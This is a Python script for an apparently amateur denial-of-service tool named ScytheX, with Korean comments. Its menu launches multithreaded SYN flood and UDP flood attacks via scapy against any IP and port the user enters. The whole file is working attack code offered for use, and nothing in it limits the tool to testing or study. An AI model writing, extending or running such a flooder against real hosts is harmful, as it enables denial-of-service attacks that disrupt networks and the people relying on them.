import os
import sys
import random
import struct
import time
import socket
import threading
from scapy.all import *

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m" 


def l4():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                          
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#    
                    
 - syn      |    syn flood attack
 - udp      |    udp flood attack
 - exit     |    leave Layer4 menu
  
    """ + TextColors.RESET)

def layer4():
    while True:
        l4()
        select = input(TextColors.BOLD + "root@ScytheX > " + TextColors.RESET)

        if select == "syn" or select.lower() == "s":
            def logo():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#

  | - SYN FLOOD ATTACK
  | - coded by 건우Sec 
                """ + TextColors.RESET)

            # 패킷 전송 함수
            def send_packets(target_ip, target_port): 
                while True:  # SYN 패킷 무한 루프
                    ip = IP(dst=target_ip)  # 대상 IP 주소 패킷 생성
                    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", options=[("MSS", 1460)]) 

                    # 출발지 포트 무작위 설정 , 1460 최대 크기 설정

                    byte = Raw(load='X' * 1400)  # 1400 바이트의 RAW 패킷 생성
                    
                    pkt = ip/tcp/byte  # ip/tcp/byte 통일
                    
                    send(pkt, verbose=0)  # 패킷 전송
                    print(TextColors.BOLD + f"[+] IP : {target_ip} [+] SYN PACKET : {pkt.summary()}" + TextColors.RESET)  
                    time.sleep(0.01)

            # 공격 시작 함수
            def start_flooding(target_ip, target_port, num_threads):
                threads = []  # 스레드 초기화
                
                for _ in range(num_threads):  # 스레드 반복
                    thread = threading.Thread(target=send_packets, args=(target_ip, target_port)) 
                    threads.append(thread) 
                    thread.start()  # 스레드 시작

                for thread in threads:  # 모든 스레드가 종료될 때까지 대기
                    thread.join()  

            # 메인 블록
            logo()  
            target_ip = input(TextColors.BOLD + "IP > ")  
            target_port = int(input(TextColors.BOLD + "Port > "))  
            num_threads = int(input(TextColors.BOLD + "Thread > "))  

            start_flooding(target_ip, target_port, num_threads)  # SYN Flood 시작


        elif select == "udp" or select.lower() == "u":
            def logo():
                  os.system('cls' if os.name == 'nt' else 'clear')
                  print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#

  | - UDP FLOOD ATTACK
  | - coded by 건우Sec  
                              """ + TextColors.RESET)
              # UDP FLOOD 함수

            def udp_flood(target_ip, target_port, time_sec):
                  end_time = time.time() + time_sec
                  packet_count = 0 
                  udp_byte = 1400  # MTU UDP 최대 바이트

                  while time.time() < end_time:  # 패킷 전송 무한 루프
                      ip = IP(dst=target_ip)  # 대상 IP 주소 패킷 생성
                      udp = UDP(sport=random.randint(1024, 65535), dport=target_port)  # 랜덤 UDP 패킷 생성
                      byte = Raw(load='X' * udp_byte)  # Raw 계층 패킷 생성
                      pkt = ip / udp / byte  # IP/UDP/Byte 통일
                      send(pkt, verbose=0)  # 패킷 전송
                      packet_count += 1
                      print(TextColors.BOLD + f"[+] IP : {target_ip} [+] UDP PACKET : {pkt.summary()}"+ TextColors.RESET)

              # UDP FLOOD 공격 함수

            def start_flooding(target_ip, target_port, time_sec, thread_count):
                  threads = []  # 스레드 초기화

                  for _ in range(thread_count):  # 스레드 반복
                      thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, time_sec))
                      threads.append(thread)
                      thread.start()  # 스레드 시작

                  for thread in threads:  # 모든 스레드가 종료될 때까지 대기
                      thread.join()

            logo()
            target_ip = input(TextColors.BOLD + "IP > "+ TextColors.RESET)
            target_port = int(input(TextColors.BOLD + "Port > "+ TextColors.RESET)) 
            time_sec = int(input(TextColors.BOLD + "Time > "+ TextColors.RESET)) 
            thread_count = int(input(TextColors.BOLD + "Thread count > "+ TextColors.RESET)) 

            start_flooding(target_ip, target_port, time_sec, thread_count)  # UDP FLOOD 시작
              

        elif select == "exit" or select.lower() == "e":
            print(TextColors.RED + "[-] bye :("+ TextColors.RESET)
            sys.exit()

    
            

      
